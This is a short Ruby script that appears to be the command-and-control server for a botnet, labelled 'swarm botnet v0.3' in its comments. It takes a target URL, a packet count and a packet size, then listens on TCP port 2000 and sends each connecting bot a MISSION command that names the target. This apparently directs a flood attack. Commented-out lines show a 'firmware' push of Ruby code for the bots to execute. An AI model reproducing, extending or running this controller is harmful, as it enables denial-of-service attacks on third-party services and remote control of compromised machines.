require 'socket'
require 'optparse'

options = {}
OptionParser.new do |opts|
    opts.banner = "Usage: parser.rb [options]"
    opts.on("-h", "--help", "Show this message") { puts opts }
    opts.on("-m MISSION", "--mission MISSION", "Mission number") { |mission| options[:mission] = mission }
    opts.on("-t TARGET", "--target TARGET", "Target url") { |target| options[:target] = target }
    opts.on("-c COUNT", "--count COUNT", "Packages count") { |count| options[:count] = count }
    opts.on("-s SIZE", "--size SIZE", "Packages size") { |size| options[:size] = size }
end.parse!

mission_id = options[:mission] || File.read("mission_no")
target = options[:target]
count = options[:count] || 10
size = options[:size] || "100 M"

puts "Mission id: #{mission_id}"
puts "Target: #{target}"
puts "Count: #{count}"
puts "Size: #{size}"

File.write "mission_no", mission_id.to_i + 1

server = TCPServer.new 2000

Kernel.loop do
    client = server.accept    # Wait for a client to connect

    # client.puts "firmware_begin"
    # client.puts "puts '~^~^~^~^~^~^~^~^~^~^~^~^~^~^'"
    # client.puts "puts 'Hello from swarm botnet v0.3'"
    # client.puts "puts '     Have a nice day'"
    # client.puts "puts '~^~^~^~^~^~^~^~^~^~^~^~^~^~^'"
    # client.puts "firmware_end"

    client.puts "type=MISSION;mission_id=#{mission_id};target=#{target};count=#{count};size=#{size}"
end
